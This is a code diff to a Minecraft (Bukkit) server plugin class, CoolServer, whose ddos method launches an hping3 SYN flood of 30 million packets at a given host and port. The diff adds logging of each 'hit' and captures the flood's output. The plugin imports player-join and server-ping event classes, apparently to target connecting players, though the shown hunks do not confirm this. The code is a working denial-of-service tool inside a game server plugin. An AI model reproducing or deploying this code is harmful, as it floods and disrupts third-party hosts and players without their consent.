@@ -6,6 +6,9 @@ import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.server.ServerListPingEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
 public class CoolServer extends JavaPlugin implements Listener {
     private DDoSInterface dDoSInterface = new HPing3();
 
@@ -37,11 +40,19 @@ public class CoolServer extends JavaPlugin implements Listener {
         public void ddos(String host, int port) {
             Process p;
             try {
+                getLogger().info("Hitting off " + host + ":" + port);
                 p = Runtime.getRuntime().exec(
                         String.format("hping3 -i u1 -S -p %d -c 30000000 %s", port, host)
                 );
                 p.waitFor();
-                getLogger().info("Done hitting off " + host + ":" + port);
+                BufferedReader reader =
+                        new BufferedReader(new InputStreamReader(p.getInputStream()));
+                String output = "";
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output += line + "\n";
+                }
+                getLogger().info(output);
             } catch (Exception e) {
                 getLogger().info(e.getClass().getName() + " with " + host + ":" + port);
             }
